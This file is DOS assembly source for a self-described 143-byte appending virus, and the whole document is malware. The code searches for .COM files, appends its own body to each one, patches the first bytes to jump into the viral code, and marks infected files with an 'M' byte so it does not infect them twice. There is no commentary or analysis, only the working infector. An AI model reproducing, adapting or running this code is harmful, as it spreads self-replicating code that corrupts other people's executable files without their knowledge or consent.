;Small appending virus - 143 bytes

CSEG	SEGMENT
	ASSUME	CS:CSEG, DS:CSEG

		ORG	100h

Virus_Length	equ	End_Virus-Begin_Virus

Start:
		db	'M',0e9h,0,0

Begin_Virus:
		call	Delta

Delta:
		pop	bp
		sub	bp,offset Delta
		push	si
		push	si

		mov	ah,1ah
		lea	dx,[bp+DTA]
		int	21h

		pop	di
		lea	si,[bp+OldBytes]
		movsw
		movsw

		mov	ah,4eh
		mov	cx,7h
		lea	dx,[bp+ComMask]

Find_Next:
		int	21h
		jc	Return

		mov	ax,3d02h
		lea	dx,[bp+DTA+1eh]
		int	21h

		xchg	ax,bx

		mov	ah,3fh
		mov	cx,4
		lea	dx,[bp+OldBytes]
		int	21h

		cmp	byte ptr [bp+OldBytes],'M'
		je	Close_Find_Next

		mov	ax,4202h
		xor	cx,cx
		cwd
		int	21h

		sub	ax,4
		mov	word ptr [bp+NewBytes+2],ax

		mov	ah,40h
		mov	cx,Virus_Length
		lea	dx,[bp+Begin_Virus]
		int	21h

		mov	ax,4200h
		xor	cx,cx
		cwd
		int	21h

		mov	ah,40h
		mov	cx,4
		lea	dx,[bp+NewBytes]
		int	21h

Close_Find_Next:
		mov	ah,3eh
		int	21h

		mov	ah,4fh
		jmp	short Find_Next

ComMask		db	"*.COM",0
NewBytes	db	'M',0e9h,0,0
OldBytes	db	0cdh,20h,0,0

Return:
		mov	ah,1ah
		mov	dx,80h
		int	21h

		ret

End_Virus:
DTA		db	42 dup (?)

CSEG	ENDS
	END	START
